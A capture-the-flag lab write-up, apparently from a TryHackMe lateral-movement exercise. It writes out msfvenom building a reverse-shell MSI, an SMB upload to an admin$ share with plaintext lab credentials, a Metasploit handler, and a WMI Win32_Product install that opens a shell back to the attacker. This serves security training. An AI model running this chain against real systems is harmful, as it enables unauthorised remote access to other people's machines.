## Exercises

### Question 1 — After running the "flag.exe" file on t1_corine.waters desktop on THMIIS, what is the flag?

Credentials for this exercise were:

- User: `ZA.TRYHACKME.COM\t1_corine.waters`
- Password: `Korine.1994`

These had administrative access, so the plan was to build an MSI payload, upload it to THMIIS, and trigger it through WMI's `Win32_Product` install method.

An MSI payload was generated with `msfvenom`:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > anoninstaller.msi        

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

**Breakdown:**
- `-p windows/x64/shell_reverse_tcp` selects a 64-bit Windows reverse shell payload
- `LHOST=lateralmovement` sets the callback address, by VPN interface name
- `LPORT=4445` sets the callback port
- `-f msi` outputs the payload wrapped as an MSI installer package
- `> anoninstaller.msi` redirects the generated payload to that file

It was then uploaded to THMIIS's `admin$` share using `t1_corine.waters`'s credentials:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ smbclient -c 'put anoninstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

putting file anoninstaller.msi as \anoninstaller.msi (447.0 kB/s) (average 447.0 kB/s)
```

**Breakdown:**
- `smbclient -c 'put anoninstaller.msi'` connects to the share and uploads the file with a single command
- `-U t1_corine.waters` is the username to authenticate as
- `-W ZA` is the Windows domain that account belongs to
- `'//thmiis.za.tryhackme.com/admin$/'` is the target share
- `Korine.1994` is the account's password

A Metasploit handler was started to catch the callback:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
LHOST => —REDACTED—
LPORT => 4445
[*] Started reverse TCP handler on —REDACTED—:4445 
```

**Breakdown:**
- `msfconsole -q` launches Metasploit quietly
- `-x "..."` runs the given commands immediately on startup, each separated by a semicolon
- `use exploit/multi/handler` selects the generic listener module
- `set payload windows/x64/shell_reverse_tcp` sets the payload type to expect, matching the MSI's embedded payload
- `set LHOST lateralmovement` sets the local interface to listen on (resolved here to `—REDACTED—`)
- `set LPORT 4445` sets the local listening port
- `exploit` starts the handler

With the handler up, a WMI session was opened from a shell on THMJMP2, authenticated as `gordon.yates`:

```powershell
PS C:\Users\gordon.yates> $username = 't1_corine.waters';                                                                                                                                                 
PS C:\Users\gordon.yates> $password = 'Korine.1994';                                                                            
PS C:\Users\gordon.yates> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;                               
PS C:\Users\gordon.yates> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\Users\gordon.yates> $Opt = New-CimSessionOption -Protocol DCOM    
PS C:\Users\gordon.yates> $Session = New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop      
```

**Breakdown:**
- `$username` / `$password` store `t1_corine.waters`'s credentials
- `ConvertTo-SecureString $password -AsPlainText -Force` converts the plaintext password into a `SecureString`, the form PowerShell credential objects expect
- `New-Object System.Management.Automation.PSCredential $username, $securePassword` builds the `PSCredential` object from the username and secure password
- `New-CimSessionOption -Protocol DCOM` builds connection options specifying DCOM as the transport
- `New-CimSession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop` opens the CIM session against THMIIS using that credential and DCOM, throwing a terminating error if it fails to connect

The `Install` method on `Win32_Product` was then invoked to trigger the uploaded MSI:

```powershell
PS C:\Users\gordon.yates> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\anoninstaller.msi"; Options = ""; AllUsers =$false}                                                     

ReturnValue PSComputerName                                                                                                      
----------- --------------                                                                                                      
       1603 thmiis.za.tryhackme.com 
```

**Breakdown:**
- `Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install` calls the install method against the remote session
- `PackageLocation = "C:\Windows\anoninstaller.msi"` points at the uploaded MSI's path on THMIIS (the `admin$` share maps to `C:\Windows\`)
- `Options = ""` leaves installer options blank
- `AllUsers = $false` installs for the current user context only

The returned `ReturnValue` of `1603` is MSI's generic install-failure code, so at this point it looked like the install itself hadn't completed successfully. The handler was started again with the same command:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
LHOST => —REDACTED—
LPORT => 4445
[*] Started reverse TCP handler on —REDACTED—:4445 
[*] Command shell session 1 opened (—REDACTED—:4445 -> 10.200.74.201:54305) at 2026-11-13 22:05:56 +0200

Shell Banner:
```

This time the connection came through: the embedded payload had run as part of the install attempt, even though MSI reported the install itself as failed.
